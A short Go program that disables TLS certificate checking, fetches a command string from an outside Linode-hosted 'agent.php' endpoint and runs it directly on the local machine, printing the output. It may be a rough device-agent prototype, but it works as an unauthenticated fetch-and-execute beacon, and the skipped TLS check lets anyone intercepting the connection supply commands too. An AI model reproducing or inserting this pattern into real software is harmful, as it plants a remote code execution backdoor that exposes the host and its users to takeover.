package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"crypto/tls"
)

func main() {
	

	tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Transport: tr}
    
	res, err := client.Get("https://li804-102.members.linode.com/fgtcfg/lib/agent.php?action=device/routine/get&devId=123")
	if err != nil {
		log.Fatal(err)
	}
	robots, err := ioutil.ReadAll(res.Body)
	res.Body.Close()
	if err != nil {
		log.Fatal(err)
	}
	

	fmt.Printf("script to run is : %s", robots)
	x := string(robots)
	out, err := exec.Command(x).Output()
    if err != nil {
        log.Fatal(err)
    }
    fmt.Printf("output is %s\n", out)

    //cmd := exec.Command("/bin/sh", mongoToCsvSH)

}